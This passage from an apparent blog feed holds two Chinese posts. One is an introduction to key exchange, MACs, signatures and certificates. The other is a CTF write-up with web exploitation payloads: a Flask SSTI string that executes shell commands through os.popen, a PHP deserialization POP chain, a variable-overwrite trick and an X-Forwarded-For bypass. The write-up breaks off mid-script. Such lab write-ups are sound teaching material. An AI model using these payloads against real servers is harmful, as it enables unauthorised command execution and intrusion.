src="https://gitee.com/sncker/resource/raw/master/image/20200104092200.png" alt=""><br>我们可以看到在这个过程中，若X方窃听，可以得到P，P(SA)，P(SB)。<br>由于无法分解，所以X方得不到SA和SB。因此X方无论怎么合成也得不到A方与B方加密使用的密钥。  </p><p>下面回到迪菲-赫尔曼密钥交换。<br>我们用公式来表示这个密钥交换法。<br>首先我们用两个整数表示一开始生成的公开密钥P：(P,G)，其中P是一个大素数，G是素数P对应生成元中的一个。<br>然后A方和B方分别准备自己的秘密数字X和Y。X和Y都要小于P-2。<br>A计算：G^X mod P<br>B计算：G^Y mod P<br>这个计算等同于前面说的合成。<br>接下来交换计算结果，再次进行合成。<br>如A方得到了B方的G^Y mod P，再次合成即(G^Y mod P)^X mod P = G^XY mod P<br>同理的，B方会得到G^YX mod P<br>这个G^XY mod P的计算结果便是最后的密钥。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200104094717.png" alt=""><br>至此，迪菲-赫尔曼密钥交换解释完毕。<br>由素数P，生成元G和G^X mod P求解X的问题是“离散对数问题”，人们至今未找到这个问题的解法，所以迪菲-赫尔曼密钥交换正是利用了这个数学难题。  </p><h2 id="消息认证码"><a href="#消息认证码" class="headerlink" title="消息认证码"></a>消息认证码</h2><p>消息认证码是检测数据在传输过程是否被伪造的技术。  </p><p>假如A方要向B方购买商品，A方需要将商品编码发送给B方，这个过程可能会被第三方伪造，从而使得B方发送错误的商品。这时就需要使用消息认证码来辨别数据是否被伪造。<br>首先，在A方将商品编码加密成密文后，还要再创建一个钥匙，并用这把钥匙和加密后的密文生成一个值，这个值就是消息认证码，称为MAC，同时还要将这个钥匙通过安全的方式发送给B方。<br>传输数据时把密文和MAC一并发给B方，B方收到数据后先用密文和钥匙生成MAC进行对比，不一致则说明数据被伪造了，B方向A方提出重新发送请求。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200104102558.png" alt=""><br><img src="https://gitee.com/sncker/resource/raw/master/image/20200104102434.png" alt=""><br>需要注意的是，即使我们采用加密技术，因为加密实质上是数值计算，所以就算X方篡改了密文，这个密文也是能进行解密的，只不过还原出来的意思可能让人难以理解，这样情况接收方可能会意识到数据被伪造了。但是对于商品编码这种本来就无法让人直接理解的内容，解密后接收者也难以判断数据是否被伪造。  </p><p>MAC我们可以理解成密钥和密文组成的字符串的“哈希值”，计算MAC的方法由HMAC,OMAC,CMAC等，目前HMAC(Hash-based MAC)应用最为广泛。  </p><p>消息认证码技术解决了通信中数据被篡改的问题。但是也存在缺点，因为使用消息认证码时，AB双方都能对消息进行加密并且计算出MAC，所以无法证明消息是A生成的还是B生成的。这就导致了事后否认的问题，比如A方发送消息后，声称“这条消息是B方捏造的”，或者B方自己生成一条消息并声称“这是A方发给我的消息”。要解决“否认”的问题，就要用到“数字签名”技术了。</p><h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>数字签名不仅实现了消息认证码的认证和防篡改功能，同时还解决了“否认”的问题。因为数字签名只有发送者才能生成，所以可以确定谁是消息的发送者。  </p><p>假设A方要给B方发送消息，A方要在发送消息时加上数字签名，这个数字签名只能由A方生成。这样，只要发送的消息上有A方的数字签名，B方就能确定是A方发送的消息。但是，B方只能验证数字签名，但不能生成。    </p><p>接下来看一下数字签名如何生成：</p><p>我们回想前面说到的公开密钥加密，消息接收者需要保管自己的私钥，并将公钥发布出去，发送者使用这个公钥加密消息。<br>我们将这个过程逆过来。<br>发送者用自己的私钥加密消息，接收方用发送者的公钥去解密。<br>如A方要发送消息给B方，那么A方就准备一对公私密钥对，将公钥交给B方，自己用私钥加密数据，B方再用公钥解密。这样就能确定消息是A方发出的。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200104111434.png" alt=""></p><p>这个过程中，由于解密使用的是公钥，那么所有人都解开密文，这个密文就没有意义了。但换一个角度来看，它保证了密文的创造者只能是持有私钥的人。<br>在公开密钥加密中，使用公钥加密，私钥解密。而在数字签名中，使用了私钥加密，公钥解密。也就是说密钥使用顺序不同，但运行结果也一样。并非所有公开密钥加密都有这一性质，但RSA加密算法是可以的。<br>这样便防止了事后否认的问题。  </p><p>我们知道公开密钥加密比较耗时，所以为了节约时间，实际上不会对消息进行直接加密，而是先求得消息的哈希值，再对哈希值进行加密，然后作为签名来使用。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200104112128.png" alt=""></p><p>虽然“数字签名”技术实现了“认证”“防篡改”“预防事后否认”的功能，但仍然存在缺陷。<br>那就是使用了“数字签名”时，虽然B方相信消息发送者是A方，但实际上也有可能是X方冒充了A方。<br>其根本原因在于，公钥中没有制作者的信息，我们无法确定公钥的制作者是谁。  </p><p>这时就要使用“数字证书”来解决这一问题。</p><h2 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h2><p>“公开密钥加密”和“数字签名”都无法保证公钥来自信息的发送者，因此，就算公钥被第三方替换，接收方也不会注意到。而“数字证书”则可以解决这一问题。  </p><p>假设A方准备了一对密钥对，他想把公钥PA发送给B。<br>A方首先要向认证中心(简称：CA)申请发行证书，证明PA确实是由A方生成的。<br>认证中心里保管着他们自己准备的公钥PC和密钥SC。<br>A方将自己的公钥PA和包含邮箱信息的资料发给认证中心。<br>认证中心判断这些资料是否为A本人。确认完毕后，认证中心用自己的私钥SC根据A的资料生成一个数字签名，并把这个数字签名和资料放到同一个文件中。再将这个文件发回给A方。这个文件就是A方的数字证书。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200104163605.png" alt=""><br>A方将作为公钥的数字证书发送给B方，B方检查数字证书中的邮箱是否为A方的，然后从认证中心获取公钥验证签名，确认这个证书是否为认证中心发行的。<br>确认完毕没有异常后，B方从数字证书中提取出A方的公钥PA，公钥便传输完毕。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200104163655.png" alt=""><br>我们来看看这个过程有没有什么问题。<br>假如X方冒充A方，向B方发送X方的公钥PX，B方没有必要信任这个以非证书形式收到的公钥。所以X方无法冒充A方。<br>如果X方为了冒充A方，向认证中心登记自己的公钥，由于X方无法使用A方的邮箱，因此无法拿到A方的证书。  </p><p>那么，X方有没有可能冒充认证中心，替换了认证中心的公钥PC呢？<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200104161237.png" alt=""><br>没错，这里同样存在着公钥来源的问题。  </p><p>但实际上，认证中心的公钥PC也是以数字证书的形式交付的，因为会有更高级的认证中心对这个认证中心署名。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200104161427.png" alt=""></p><p>比如公司B想提供认证服务，但是公司B还没有得到社会广泛认可，那么公司B可以向被社会广泛认可的公司A申请数字证书，这就说明公司B得到了公司A的信任。<br>这样，通过大型组织对小型组织的信赖担保，树结构就建立起来了。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200104161521.png" alt=""><br>位于顶端的认证中心被称为“根认证中心”，其自身的正当性由自己证明，对自身进行声明的证书称为“根证书”。如果根认证中心不被信任，整个组织就无法运转。<br>根认证中心多为大型企业，或与政府关联且取得社会信赖的组织。<br>到这里，我们可以知道，其实每个人都能成为认证中心，但还是建议向经过政府审查的大型企业机构进行申请，这些机构更令人放心。  </p><p>到这里，我们介绍完了个人之间交付公钥的例子，而网站之间的通信同样也要用到数字证书，只要收到网站的数字证书，就说明网站未被第三者冒充。<br>此处的证书称为“服务器证书”，同样由认证中心发行。个人证书与邮箱信息对应，而服务器证书与域名信息对应。这样就能确定，域名和储存网站内容的服务器是由同一个组织管理的。  </p><h1 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h1><p>本文并未讲解详细的技术，仅是围绕信息传输的安全问题，牵扯出一些安全技术，算作信息安全的启蒙。这也是本人阅读某些资料发现的内容，觉得有意思，有意义，便摘写下来。若有错误，敬请联系本人进行改正！</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;当使用互联网交换数据时，数据通过各种网络和设备到达另一方。因此，为了安全地使用互联网，安全技术是不可缺的。&lt;br&gt;本文通过围绕信息的安全传输讲解一些基本的、常见的安全技术来普及一些基本的安全知识，不特定深入去讲解某种技术，仅是用简单的语言去粗略地描述这种过程，目的是能通俗易懂地使读者理解。  &lt;/p&gt;</summary>
    
    
    
    <category term="信息安全" scheme="https://sncker.github.io/blog/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="信息安全" scheme="https://sncker.github.io/blog/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>WeCTF第一期wp</title>
    <link href="https://sncker.github.io/blog/2019/10/07/WeCTF%E7%AC%AC%E4%B8%80%E6%9C%9Fwp/"/>
    <id>https://sncker.github.io/blog/2019/10/07/WeCTF%E7%AC%AC%E4%B8%80%E6%9C%9Fwp/</id>
    <published>2019-10-07T00:59:00.000Z</published>
    <updated>2020-04-25T10:45:49.635Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h2><p>直接看源代码  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>flag is here<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    看不到 flag 吗？</span><br><span class="line">    <span class="comment">&lt;!-- wectf&#123;the_iiiis_flag&#125; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wectf&#123;the_iiiis_flag&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="easy01"><a href="#easy01" class="headerlink" title="easy01"></a>easy01</h2><p>看源代码  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you need get a name!<span class="comment">&lt;!-- $_GET[&quot;name&quot;] === &quot;wectf&quot; --&gt;</span></span><br></pre></td></tr></table></figure><p>简单GET传参。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?name&#x3D;wectf</span><br></pre></td></tr></table></figure><p>拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wectf&#123;1e2e3c4a5d6c123d456eaec456789f&#125; </span><br></pre></td></tr></table></figure><h2 id="medium01"><a href="#medium01" class="headerlink" title="medium01"></a>medium01</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&quot;source.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$a</span> = trim(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$a</span>&gt;<span class="number">999999</span> <span class="keyword">and</span> strlen(<span class="variable">$a</span>)&lt;<span class="number">5</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wectf&#123;xxxxxxxxxxxxxxx&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>值大于999999长度小于五，可以用科学计数法绕过。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?a&#x3D;9e9</span><br></pre></td></tr></table></figure><p>拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wectf&#123;eeeeeeeee_is_low&#125;</span><br></pre></td></tr></table></figure><h2 id="medium02"><a href="#medium02" class="headerlink" title="medium02"></a>medium02</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="string">&quot;source.php&quot;</span>);</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$name</span> == <span class="string">&quot;password&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    extract(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$name</span> == <span class="string">&quot;isnotonly&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wectf&#123;xxxxxxxxxxxxxx&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>变量覆盖。<br>先设置一对cookie键值对pass=password<br>然后再post一个name=isnotonly<br>拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wectf&#123;flag_1s_here&#125;</span><br></pre></td></tr></table></figure><h2 id="easy02"><a href="#easy02" class="headerlink" title="easy02"></a>easy02</h2><p>访问提示ip禁止访问。<br>尝试添加X-Forwared-For:127.0.0.1绕过。<br>拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wectf&#123;X_FORWARDED_FOR_is&#125; </span><br></pre></td></tr></table></figure><h2 id="high02"><a href="#high02" class="headerlink" title="high02"></a>high02</h2><p>查看源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello guest&lt;!-- get a name --&gt;</span><br></pre></td></tr></table></figure><p>提示get a name，用GET方法传入一个name。<br>发现传入的值会回显回来。<br>看一下消息头显示是Server:gunicorn/19.9.0<br>考虑是flask的ssti。<br>测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;&#123;1*2&#125;&#125;</span><br></pre></td></tr></table></figure><p>回显Hello 2<br>测试命令执行  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%&#125;&#123;&#123;c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>回显Hello uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>读flag  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%&#125;&#123;&#123;c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat flag.txt&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wectf&#123;what_a_easy_ssti&#125;</span><br></pre></td></tr></table></figure><h2 id="Crazy1"><a href="#Crazy1" class="headerlink" title="Crazy1"></a>Crazy1</h2><p>php反序列化题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">O00O</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;value-&gt;func1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&#123;xxxxxxxxxxxxxxxxx&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ina</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;value-&gt;get_flag();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">func1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;value-&gt;func2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Func_m</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$value1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$value2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;value2 = <span class="string">&quot;flag&quot;</span>.<span class="keyword">$this</span>-&gt;value1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Func_t</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func2</span>,<span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable">$func</span> = <span class="keyword">$this</span>-&gt;value;</span><br><span class="line">                <span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="string">&quot;source.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$name</span>) &lt; <span class="number">10</span>)&#123;</span><br><span class="line">        extract(<span class="variable">$_POST</span>);</span><br><span class="line">        unserialize(<span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>又用到了变量覆盖，主要还是反序列化。<br>理清楚逻辑即可。  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="comment">//O00O-&gt;Call-&gt;Func_t-&gt;Func_m-&gt;ina-&gt;GetFlag</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">O00O</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$value</span>;<span class="comment">//应为Call对象</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)//当对象所在函数调用完毕后执行。</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;value-&gt;func1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&#123;xxxxxxxxxxxxxxxxx&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ina</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$value</span>;<span class="comment">//应为GetFlag类对象</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)//当对象被当做一个字符串使用时调用。</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;value-&gt;get_flag();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$value</span>;<span class="comment">//应为Func_t对象</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">func1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;value-&gt;func2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Func_m</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$value1</span>;<span class="comment">//应为ina</span></span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$value2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)//当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;value2 = <span class="string">&quot;flag&quot;</span>.<span class="keyword">$this</span>-&gt;value1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Func_t</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$value</span>;<span class="comment">//应为Func_m对象</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func2</span>,<span class="variable">$a</span></span>)//当调用对象中不存在的方法会自动调用该方法。</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable">$func</span> = <span class="keyword">$this</span>-&gt;value;</span><br><span class="line">                <span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>直接写脚本生成payload了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> O00O();</span><br><span class="line"><span 